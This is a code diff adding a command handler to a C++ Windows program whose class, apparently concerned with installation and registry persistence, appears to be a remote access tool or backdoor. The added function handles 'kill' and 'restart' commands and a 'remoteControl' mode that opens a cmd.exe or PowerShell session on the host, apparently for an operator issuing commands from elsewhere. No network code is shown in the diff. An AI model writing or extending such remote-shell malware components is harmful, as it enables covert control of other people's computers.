@@ -214,3 +214,56 @@ bool installationAndStart::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valu
     else
         return false;
 }
+
+std::string installationAndStart::processCommand(std::string command) {
+    if (command == "kill")
+    {
+        killSelf();
+        return "killing self";
+    }
+    else if (command == "restart")
+    {
+        restartSelf();
+        return "restarting";
+    }
+
+    else if (processParameter(command, "remoteControl"))
+    {
+        if (!CMD::cmdOpen)
+        {
+            if (command == "cmd")
+                command = "C:\\WINDOWS\\system32\\cmd.exe";
+            else if (command == "pws")
+                command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+            else if (command == "pws32")
+                command = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
+
+            if (Utility::fileExists(command))
+            {
+                char* buffer = new char[command.length() + 3];
+                buffer[command.length()] = '\0';
+                strcpy_s(buffer, command.length() + 2, command.c_str());
+
+                _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
+                while (!CMD::cmdOpen)
+                {
+                    Sleep(50);
+                }
+                delete[] buffer;
+                return "CMD session opened.";
+            }
+            else
+                return "File doesn't exist.";
+        }
+        else
+        {
+            CMD::cmdptr->writeCMD("exit");
+            CMD::cmdOpen = false;
+            return "CMD session closed";
+        }
+    }
+    else
+    {
+        return "Command '" + command + "' was not recognized.";
+    }
+}
